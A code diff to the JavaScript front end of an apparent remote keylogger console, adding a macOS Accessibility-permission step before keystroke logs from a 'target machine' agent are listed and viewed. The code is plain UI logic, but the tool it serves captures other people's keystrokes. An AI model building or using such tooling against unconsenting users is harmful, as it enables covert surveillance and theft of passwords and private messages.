@@ -10,6 +10,10 @@ if (!clientId) {
 const clientLabel = document.getElementById("clientLabel");
 const statusPill = document.getElementById("status-pill");
 const fileList = document.getElementById("file-list");
+const fileListPanel = document.getElementById("file-list-panel");
+const permissionGate = document.getElementById("permission-gate");
+const permissionStatus = document.getElementById("permission-status");
+const requestPermissionBtn = document.getElementById("requestPermissionBtn");
 const refreshBtn = document.getElementById("refreshBtn");
 const clearBtn = document.getElementById("clearBtn");
 const logViewer = document.getElementById("log-viewer");
@@ -43,6 +47,8 @@ let searchMatches = [];
 let currentMatchIndex = -1;
 let globalSearchCache = new Map();
 let globalSearchAbortController = null;
+let clientOs = ""; // filled from the "ready" message
+let needsPermissionGate = false; // true for darwin/mac clients
 
 clientLabel.textContent = clientId;
 
@@ -61,7 +67,8 @@ function connect() {
   ws.onopen = () => {
     console.log("Keylogger connected");
     updateStatus("pill-online", "Connected");
-    requestFileList();
+    // Do NOT request the file list here — wait for the "ready" message which
+    // carries clientOs so we know whether to show the macOS permission gate first.
   };
 
   ws.onmessage = (event) => {
@@ -91,12 +98,76 @@ function send(msg) {
   }
 }
 
+function isMacOs(os) {
+  const s = String(os || "").toLowerCase();
+  return s.includes("darwin") || s.includes("mac");
+}
+
+function showPermissionGate() {
+  permissionGate.classList.remove("hidden");
+  fileListPanel.classList.add("hidden");
+  permissionStatus.classList.add("hidden");
+  requestPermissionBtn.disabled = false;
+  requestPermissionBtn.innerHTML = '<i class="fa-solid fa-key"></i><span>Request Accessibility Permission</span>';
+}
+
+function showFileListPanel() {
+  permissionGate.classList.add("hidden");
+  fileListPanel.classList.remove("hidden");
+}
+
+function setPermissionStatus(type, text) {
+  // type: "success" | "error" | "pending"
+  permissionStatus.classList.remove("hidden", "border-green-600", "bg-green-900/30", "text-green-300",
+                                     "border-red-600", "bg-red-900/30", "text-red-300",
+                                     "border-yellow-600", "bg-yellow-900/30", "text-yellow-300");
+  if (type === "success") {
+    permissionStatus.classList.add("border-green-600", "bg-green-900/30", "text-green-300");
+  } else if (type === "error") {
+    permissionStatus.classList.add("border-red-600", "bg-red-900/30", "text-red-300");
+  } else {
+    permissionStatus.classList.add("border-yellow-600", "bg-yellow-900/30", "text-yellow-300");
+  }
+  permissionStatus.textContent = text;
+}
+
 function handleMessage(msg) {
   console.log("Received:", msg.type);
 
   switch (msg.type) {
     case "ready":
-      console.log("Keylogger session ready");
+      clientOs = msg.clientOs || "";
+      needsPermissionGate = isMacOs(clientOs);
+      console.log("Keylogger session ready, clientOs:", clientOs, "needsPermissionGate:", needsPermissionGate);
+      if (needsPermissionGate) {
+        showPermissionGate();
+      } else {
+        showFileListPanel();
+        requestFileList();
+      }
+      break;
+    case "keylog_permission_result":
+      requestPermissionBtn.disabled = false;
+      if (msg.granted) {
+        setPermissionStatus("success", "Permission granted — loading logs...");
+        setTimeout(() => {
+          showFileListPanel();
+          requestFileList();
+        }, 800);
+      } else {
+        let reason;
+        if (msg.reason === "keylogger_disabled") {
+          reason = "The keylogger is not enabled in this agent build. " +
+            "macOS keylogger support requires CGO and must be compiled natively on macOS. " +
+            "Rebuild the agent on a macOS host with CGO enabled.";
+        } else if (msg.reason === "user_denied") {
+          reason = "Permission denied by the user on the target machine.";
+        } else {
+          reason = msg.reason || "Permission was not granted.";
+        }
+        setPermissionStatus("error", reason);
+        requestPermissionBtn.innerHTML = '<i class="fa-solid fa-key"></i><span>Try Again</span>';
+      }
       break;
     case "status":
       if (msg.status === "offline") {
@@ -668,6 +739,13 @@ function openFileWithSearch(filename, query, targetIndex) {
     }
   }, 500);
 }
+
+requestPermissionBtn.addEventListener("click", () => {
+  requestPermissionBtn.disabled = true;
+  requestPermissionBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i><span>Requesting...</span>';
+  setPermissionStatus("pending", "Waiting for user response on the target machine...");
+  send({ type: "keylog_request_permission" });
+});
 
 refreshBtn.addEventListener("click", () => {
   requestFileList();
